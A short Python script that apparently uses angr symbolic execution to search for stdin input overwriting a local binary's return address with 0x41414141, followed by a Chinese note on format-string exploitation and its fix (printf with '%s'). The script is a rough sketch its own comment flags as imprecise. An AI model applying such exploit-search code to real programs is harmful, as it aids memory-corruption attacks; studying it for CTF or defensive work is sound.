import angr
import claripy

proj = angr.Project('./fmt', auto_load_libs=False)
# 创建符号化stdin
input_len = 100
sym_stdin = claripy.BVS('stdin', input_len * 8)
state = proj.factory.entry_state(stdin=angr.SimFile('/dev/stdin', content=sym_stdin))

simgr = proj.factory.simulation_manager(state)

# 目标：覆盖返回地址为0x41414141（示例）
def target(state):
    # 检查返回地址是否被覆盖
    ret_addr = state.regs.rip  # 实际需要检查栈上返回地址
    return state.solver.is_true(ret_addr == 0x41414141)

simgr.explore(find=target)

if simgr.found:
    found = simgr.found[0]
    solution = found.solver.eval(sym_stdin, cast_to=bytes)
    print(f"Payload: {solution}")
else:
    print("No path found")


注意：实际格式化字符串漏洞的利用需要精确计算偏移，angr可以辅助但通常需要手动调整。修复方案：使用`printf("%s", buf)`代替`printf(buf)`。

